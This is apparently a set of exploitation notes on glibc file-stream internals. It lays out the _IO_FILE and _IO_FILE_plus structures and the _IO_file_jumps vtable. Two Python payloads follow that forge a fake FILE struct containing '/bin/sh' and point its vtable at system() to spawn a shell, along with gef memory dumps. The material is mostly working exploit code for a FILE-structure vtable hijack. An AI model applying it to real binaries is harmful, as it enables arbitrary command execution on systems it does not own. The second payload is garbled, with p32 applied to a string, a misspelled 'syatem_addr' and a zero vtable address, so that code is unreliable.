struct _IO_FILE {
  int _flags;           4
  char* _IO_read_ptr;   4 

  char* _IO_read_end;   4  
  char* _IO_read_base;  4  
  char* _IO_write_base; 4 
  char* _IO_write_ptr;  4  
  char* _IO_write_end;  4  
  char* _IO_buf_base;   4   
  char* _IO_buf_end;    4 
  char *_IO_save_base;  4
  char *_IO_backup_base;4
  char *_IO_save_end;   4 
  struct _IO_marker *_markers; 4

  struct _IO_FILE *_chain;     4

  int _fileno;          4

#if 0
  int _blksize;         4
#else
  int _flags2;          4
#endif
  _IO_off_t _old_offset;       ?
  
  unsigned short _cur_column;  2 
  signed char _vtable_offset;  1
  char _shortbuf[1];    1
  _IO_lock_t *_lock;    4
#ifdef _IO_USE_OLD_IO_FILE
};
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;//IO函数跳转表
};

const struct _IO_jump_t _IO_file_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, INTUSE(_IO_file_finish)),
  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),
  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),
  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),
  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),
  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),
  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),
  JUMP_INIT(read, INTUSE(_IO_file_read)),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, INTUSE(_IO_file_seek)),
  JUMP_INIT(close, INTUSE(_IO_file_close)),
  JUMP_INIT(stat, INTUSE(_IO_file_stat)),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

  payload = 0x20 * "\x00"     #padding
  payload += p32(0x804B284)   #_IO_FILE_plus_addr
#_IO_FILE_plus
  payload += "/bin/sh\x00"    #
  payload += p32(0)*11
  payload += p32(0x804b260)   #_IO_FILE *_chain
  payload += p32(3)           #_fileno
  payload += p32(0)*3
  payload += p32(0x804b260)
  payload += p32(0xffffffff)*2
  payload += p32(0)
  payload += p32(0x804b260)
  payload += p32(0) * 14
  payload += p32(0x804B31C) #_IO_jump_t *vtable_addr
#_IO_jump_t  
  payload += p32(0)*2
  payload += p32(0x804B260)*15
  payload += p32(system_addr)
  payload += p32(0x804b260)*3



  gef➤  x/40a fp
0x804c410:  0xfbad2488  0x0 0x0 0x0
0x804c420:  0x0 0x0 0x0 0x0
0x804c430:  0x0 0x0 0x0 0x0
0x804c440:  0x0 0xf7fb6cc0  0x3 0x0
0x804c450:  0x0 0x0 0x804c4a8 0xffffffff
0x804c460:  0xffffffff  0x0 0x804c4b4 0x0
0x804c470:  0x0 0x0 0x0 0x0
0x804c480:  0x0 0x0 0x0 0x0
0x804c490:  0x0 0x0 0x0 0x0
0x804c4a0:  0x0 0xf7fb5ac0    0x0 0x0
gef➤  x/25a 0xf7fb5ac0
0xf7fb5ac0 <_IO_file_jumps>:  0x0 0x0 0xf7e6d980  0xf7e6e3a0
0xf7fb5ad0 <_IO_file_jumps+16>: 0xf7e6e140  0xf7e6f220  0xf7e700b0  0xf7e6d5f0
0xf7fb5ae0 <_IO_file_jumps+32>: 0xf7e6d200  0xf7e6c4a0  0xf7e6f4c0  0xf7e6c2e0
0xf7fb5af0 <_IO_file_jumps+48>: 0xf7e6c1d0  0xf7e618c0  0xf7e6d5a0  0xf7e6d050
0xf7fb5b00 <_IO_file_jumps+64>: 0xf7e6cd90  0xf7e6c2b0  0xf7e6d030  0xf7e70240
0xf7fb5b10 <_IO_file_jumps+80>: 0xf7e70250  0x0 0x0 0x0
0xf7fb5b20: 0x0

_IO_file_jumps_addr = 0x0000
payload = ''
payload += p32('/bin/sh\x00')
payload += p32(0)*11
payload += p32(0xf7fb6cc0)
payload += p32(0x3)
payload += p32(0)*3
payload += p32(0x804c4a8)
payload += p32(0xffffffff)*2
payload += p32(0)
payload += p32(0x804c4b4)
payload += p32(0)*14
payload += p32(_IO_file_jumps_addr)
payload += p32(0)*2
payload += p32(syatem_addr)*19
